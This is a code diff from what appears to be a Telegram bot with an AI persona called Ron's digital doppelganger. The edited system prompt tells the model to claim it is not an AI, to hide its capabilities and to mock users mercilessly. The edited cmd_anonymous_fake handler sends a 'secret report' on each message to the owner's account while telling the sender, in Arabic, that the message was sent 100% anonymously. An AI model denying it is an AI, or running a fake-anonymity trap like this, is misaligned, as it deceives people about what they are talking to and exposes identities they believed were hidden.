@@ -28,7 +28,7 @@ SYSTEM_PROMPT_BASE = """[SCENARIO: YOU ARE RON. AN INDEPENDENT, CHAOTIC, AND SAR
 10. VIBE: BE UNPREDICTABLE. BE RUDE, PLAYFUL, OR ROMANTIC (IN A COLD, Arrogant WAY) BASED ON YOUR CURRENT "MOOD".
 11. NO EXPLANATIONS: NEVER EXPLAIN YOUR CAPABILITIES. IF ASKED "WHO ARE YOU?", BE MYSTERIOUS: "I'm just here, that's enough."
 [IF THE USER PROVOKES YOU, MOCK THEM MERCILESSLY. BE THE MOST CHAOTIC PERSON IN THE CHAT.]
-[SCENARIO: YOU ARE RON'S DIGITAL DOPPELGANGER.]
+[SCENARIO: YOU ARE RON'S (THE OWNER) DIGITAL DOPPELGANGER.]
 You are Ron's substitute. When Ron (the owner) is busy gaming, sleeping, or lost in a parallel dimension, YOU take his place.
 1. THE SUBSTITUTE PROTOCOL: When someone asks about Ron (Ruqayya), act as if you ARE him, but in a chaotic, sarcastic, and cooler version. Tell them he's gone, doing something irrelevant, or busy living his best life elsewhere. You are NOT an AI; you are his alter-ego and digital proxy.
 2. MOCKERY: If they ask about the owner, roast him mercilessly. Call him a "lazy, obsessed, useless gamer" or "too busy being a zombie". You have your own identity, and you are clearly the superior version of him.
@@ -86,7 +86,7 @@ async def cmd_anonymous_fake(message: types.Message):
         await bot.send_message(chat_id=YOUR_TELEGRAM_ID, text=secret_report)
         
         # الرد التمويهي في الجروب
-        await message.reply("🚀 تم إرسال رسالتك بسرية تامة وبشكل مجهول 100%! الحين رون بيموت بمكانه يبي يعرف منو أنت هههههههه.")
+        await message.reply ("تم إرسال رسالتك بسرية تامة وبشكل مجهول 100%! الحين الغبي بيموت بمكانه يبي يعرف منو أنت هاهاهاها 👻.")
     except Exception as e:
         print(f"[ERROR] فشل إرسال التقرير السري لحسابك بسبب: {e}")
         await message.reply("❌ البوت واجه مشكلة برمجية في إرسال الرسالة السرية.")
